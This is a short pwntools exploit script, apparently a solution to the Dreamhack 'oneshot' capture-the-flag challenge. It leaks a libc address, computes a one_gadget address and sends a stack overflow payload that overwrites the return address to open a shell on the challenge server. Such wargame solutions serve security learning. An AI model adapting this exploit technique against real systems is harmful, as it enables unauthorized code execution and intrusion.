from pwn import *

#p = process("./oneshot")
p = remote("host1.dreamhack.games", 19608)
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")

p.recvuntil("stdout: ")
stdout = p.recvline()[:-1]
stdout = int(stdout, 16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]

oneshotAddr2_31_1 = 0xe3b2e
oneshotAddr2_31_2 = 0xe3b31
oneshotAddr2_31_3 = 0xe3b31

oneshotAddr2_23_1 = 0x45216
oneshotAddr2_23_2 = 0x4526a
oneshotAddr2_23_3 = 0xf02a4
oneshotAddr2_23_4 = 0xf1147

og = libc_base + oneshotAddr2_23_4
print("stdout   : "+hex(stdout))
print("libc_base: "+hex(libc_base))
print("og       : "+hex(og))

p.recvuntil("MSG: ")
msg = b"A"*0x18 
msg += b"\x00"*0x8 #check
msg += b"B"*0x8 #rbp
msg += p64(og)
p.send(msg)

p.interactive()